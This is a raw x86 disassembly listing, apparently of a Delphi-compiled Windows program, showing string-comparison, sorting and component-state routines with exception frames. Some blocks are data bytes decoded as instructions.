mov eax [ esi ]
cmp [ eax + ebp * 2 - 0x4 ] 0x28
sete [ esp + 0x9 ]
jmp r-xdata
mov eax [ esp + 0x4 ]
sub eax ebp
cmp eax 0x2
setge [ esp + 0x8 ]
jmp r-xdata
mov eax [ esp + 0x4 ]
sub eax 0x4
mov eax [ eax ]
mov [ esp + 0x4 ] eax
mov [ esp + 0xa ] 0x0
mov eax [ esi ]
cmp [ eax + ebp * 2 + 0x2 ] 0x29
sete [ esp + 0xa ]
jmp r-xdata
cmp [ esp + 0x9 ] 0x0
je r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
cmp [ esp + 0xb ] 0x0
je r-xdata
movzx eax [ esp + 0xa ]
mov [ esp + 0xb ] al
jmp r-xdata
sub_469090
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_4691bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_449d2c
mov ebx 0x1
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov [ ebp - 0xc ] eax
cmp ebx [ ebp - 0xc ]
jg r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4691c2
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov esi [ ebp - 0x4 ]
test esi esi
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xd800
jb r-xdata
mov eax esi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0xdfff
ja r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
cmp [ edi + ebx * 2 - 0x2 ] 0x26
jne r-xdata
mov eax edi
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp ebx [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp - 0xc ]
sub eax ebx
dec eax
jl r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov edi eax
inc ebx
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + ebx * 2 - 0x2 ] 0x26
je r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0xa
cmp [ eax ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx * 2 - 0x2 ]
call sub_449e98
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov [ ebp - 0x10 ] eax
sub_4691cc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4692b5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_468f74
mov ebx [ ebp - 0xc ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_468f74
mov esi [ ebp - 0x10 ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] ebx
mov edx [ ebp - 0x14 ]
call sub_449d80
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] esi
mov edx [ ebp - 0x14 ]
call sub_449d80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push esi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4692bc
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
sub_469410
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_448fc8
mov eax [ r-xdata ]
call sub_423d34
mov eax [ r-xdata ]
call sub_423dd4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_423d80
mov eax [ r-xdata ]
call sub_423c78
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4325b4
mov [ rw-data ] eax
sub_469557
xchg esp eax
inc esi
add [ edi + ebx ] ah
inc edx
add [ edx ] al
add [ ecx ] cl
dec esp
imul esi [ ebx + 0x74 ] 0x6e746341
jae r-xdata
push esi
inc esp
add [ eax ] dl
add [ eax ] al
jmp [ eax ]
add ah al
sub_46988e
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + 0x155c0045 ] al
inc ebp
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add [ eax + 0x480046aa ] bl
in al dx
inc edx
add ah ch
or eax 0x1b9c0045
inc ebp
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add al bl
test al 0x46
add [ eax ] cl
in eax dx
inc edx
add [ esp + ebp * 8 - 0x556bffbe ] ch
inc esi
add [ eax - 0x14 ] dh
inc edx
add [ eax ] dh
test eax 0xf400046
inc ebp
add ah al
sbb [ ebp ] eax
pop esp
sbb [ ebp ] eax
hlt
sub_469a16
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + 0x155c0045 ] al
inc ebp
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add [ eax + 0x480046aa ] bl
in al dx
inc edx
add ah ch
or eax 0x1b9c0045
inc ebp
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add al bl
test al 0x46
add [ eax ] cl
in eax dx
inc edx
add [ esp + ebp * 8 - 0x556bffbe ] ch
inc esi
add [ eax - 0x14 ] dh
inc edx
add [ eax ] dh
test eax 0xf400046
inc ebp
add ah al
sbb [ ebp ] eax
pop esp
sbb [ ebp ] eax
hlt
sub_469b1e
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + 0x155c0045 ] al
inc ebp
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add [ eax + 0x480046aa ] bl
in al dx
inc edx
add ah ch
or eax 0x1b9c0045
inc ebp
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add al bl
test al 0x46
add [ eax ] cl
in eax dx
inc edx
add [ esp + ebp * 8 - 0x556bffbe ] ch
inc esi
add [ eax - 0x14 ] dh
inc edx
add [ eax ] dh
test eax 0xf400046
inc ebp
add ah al
sbb [ ebp ] eax
pop esp
sbb [ ebp ] eax
hlt
sub_469f3e
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah bl
mov al 0x46
add [ ebp + edx + 0x45 ] bl
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add [ eax + 0x480046aa ] bl
in al dx
inc edx
add ah ch
or eax 0x1b9c0045
inc ebp
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax + esi * 4 + 0x46 ] bh
add [ eax ] cl
in eax dx
inc edx
add [ esp + ebp * 8 - 0x556bffbe ] ch
inc esi
add [ eax - 0x14 ] dh
inc edx
add [ eax ] dh
test eax 0xf400046
inc ebp
add ah al
sbb [ ebp ] eax
pop esp
sbb [ ebp ] eax
hlt
sub_46a046
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah bl
mov al 0x46
add [ ebp + edx + 0x45 ] bl
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add [ eax + 0x480046aa ] bl
in al dx
inc edx
add ah ch
or eax 0x1b9c0045
inc ebp
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax + esi * 4 + 0x46 ] bh
add [ eax ] cl
in eax dx
inc edx
add [ esp + ebp * 8 - 0x556bffbe ] ch
inc esi
add [ eax - 0x14 ] dh
inc edx
add [ eax ] dh
test eax 0xf400046
inc ebp
add ah al
sbb [ ebp ] eax
pop esp
sbb [ ebp ] eax
hlt
sub_46a31c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ esi + eax * 2 + 0x2c00 ] ah
add [ esp + ecx * 4 + 0x48 ] al
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xeec0042 0x49
sub_46a382
dec eax
add [ eax + 0x340042ea ] ah
jmp r-xdata
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_46a38b
add [ eax - 0x4fffbd15 ] cl
leave
dec eax
add ah cl
adc eax [ ebp ]
cmp dl cl
dec eax
add ah dh
adc eax [ ebp ]
adc [ edi ] cl
dec ecx
add [ eax ] dl
int3
sub_46a3b8
adc [ eax * 2 + 0x48cb5400 ] 0x0
mov [ eax * 2 + 0x48cb7800 ] dl
add [ eax + 0x18004514 ] dl
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_46a430
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
xor edx edx
push ebp
push sub_46a4ab
push [ fs : edx ]
mov [ fs : edx ] esp
mov esi ebx
mov edx [ esi + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx [ esi + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
retn
mov edx [ eax ]
call [ edx + 0x24 ]
sub_46a4c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4250f4
mov [ esi + 0x18 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46a504
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx esi
mov eax ebx
call sub_425198
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x10 ]
call sub_449d2c
pop esi
pop ebx
retn
sub_46a568
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_46a858
push eax
mov edx esi
mov eax ebx
call sub_46a858
mov edx eax
mov eax ebx
pop ecx
mov ebx [ eax ]
call [ ebx + 0x28 ]
pop edi
pop esi
pop ebx
retn
sub_46a5a4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x1d ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4254d8
dec eax
jle r-xdata
push esi
mov eax ebx
call sub_4254d8
mov ecx eax
dec ecx
xor edx edx
mov eax ebx
call sub_46a7c4
sub_46a5d4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx edx
xor edx edx
push ebp
push sub_46a74e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22 ] 0x0
je r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push esi
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x24 ]
call [ esi + 0x20 ]
mov ebx eax
jmp r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x10 ]
call sub_449d80
lea eax [ ebp - 0x10 ]
mov edx [ esi + 0x10 ]
call sub_449d80
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x10 ]
call sub_449d80
lea eax [ ebp - 0x8 ]
mov edx [ esi + 0x10 ]
call sub_449d80
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a755
lea eax [ ebp - 0x10 ]
mov edx 0x4
call j_sub_44936c
retn
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x10 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
call sub_4494dc
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push esi
mov eax [ ebp - 0x10 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0xc ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
mov ebx eax
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
call sub_4494dc
push esi
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push 0x0
push 0x400
call CompareStringW
sub eax 0x2
mov ebx eax
jmp r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
sub_46a768
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_46a858
mov ebp eax
mov edx edi
mov eax ebx
call sub_46a858
mov [ esp ] eax
mov edx esi
mov eax ebx
call sub_46a858
call sub_425180
mov esi eax
mov edx edi
mov eax ebx
call sub_46a858
call sub_425180
mov edx eax
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov edx esi
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46a7c4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jl r-xdata
inc ebx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call [ ebp + 0x8 ]
test eax eax
jg r-xdata
dec esi
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46a768
cmp ebx [ ebp - 0x10 ]
jne r-xdata
cmp esi [ ebp - 0x8 ]
jle r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
mov [ ebp - 0x8 ] ebx
cmp ebx [ ebp - 0xc ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_46a7c4
inc ebx
dec esi
mov [ ebp - 0x10 ] ebx
mov ebx [ ebp - 0x8 ]
mov esi [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
shr eax 0x1
mov [ ebp - 0x10 ] eax
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46a890
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
xor edx edx
mov eax esi
call sub_425844
mov [ esi + 0x1c ] 0x0
mov [ esi + 0x1d ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46a8d8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4514b0
mov [ esi + 0xc8 ] 0xffffffff
mov [ esi + 0x60 ] 0x0
mov dl 0x1
mov eax esi
call sub_451830
mov dl 0x1
mov eax esi
call sub_46aacc
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_46a930
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x1
xor eax eax
push ebp
push sub_46aa49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa8 ] 0x0
retn
mov eax edi
mov edx [ r-xdata ]
call sub_4483ac
mov ecx eax
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4246e8
cmp edi [ eax + 0x20 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4246e8
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4483ac
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0xdc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx ebx
call sub_4246e8
pop edx
mov ecx [ eax ]
call [ ecx + 0xa4 ]
sub_46aa58
push ebx
push ecx
mov [ esp ] 0xffffffff
cmp [ eax + 0xba ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_46aa98
push ebx
mov ebx eax
mov eax ebx
call sub_42e6f8
movzx eax [ ebx + 0xa1 ]
test al al
je r-xdata
mov eax [ ebx + 0xac ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_46aacc
pop ebx
retn
mov edx eax
mov eax ebx
call sub_46abd0
sub_46aacc
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0xa0 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0xa0 ] dl
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0xa1 ] dl
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
cmp eax 0xffffffff
je r-xdata
inc eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x0
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_46ac3c
inc [ ebp - 0xc ]
dec [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x1
xor eax eax
push ebp
push sub_46ab9d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4246e8
movzx edx [ ebp - 0x5 ]
mov ecx [ eax ]
call [ ecx + 0x98 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0xb0 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x50 ]
mov edx [ ebp - 0xc ]
call sub_4246e8
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_46abd0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
test ebp ebp
je r-xdata
cmp ebp [ ebx + 0xa4 ]
je r-xdata
test [ ebx + 0x1c ] 0x1
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ ebx + 0xa4 ] ebp
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xac ] ebp
jmp r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4246e8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4246e8
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_46ac3c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x50 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ ebx + 0xc8 ] ebp
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4246e8
mov edx ebp
mov ecx [ eax ]
call [ ecx + 0xa4 ]
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4246e8
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
sub_46ac9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
cmp [ esi + 0xd2 ] 0x0
setne bl
test bl bl
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ esi + 0xd4 ]
call [ esi + 0xd0 ]
sub_46acec
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46adbb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
cmp esi eax
jge r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test eax eax
jle r-xdata
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
jmp r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov ecx esi
mov edx ebx
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46adc2
lea eax [ ebp - 0x18 ]
call j_sub_449348
lea eax [ ebp - 0xc ]
call j_sub_449348
retn
sub_46adcc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
sub cl 0x1
jb r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
dec cl
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
jmp r-xdata
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
cmp [ eax + 0xa0 ] 0x0
je r-xdata
inc esi
xor ebp ebp
mov eax [ eax + 0x50 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_4483ac
mov eax [ eax + 0x2f4 ]
call sub_4ae028
mov ebx eax
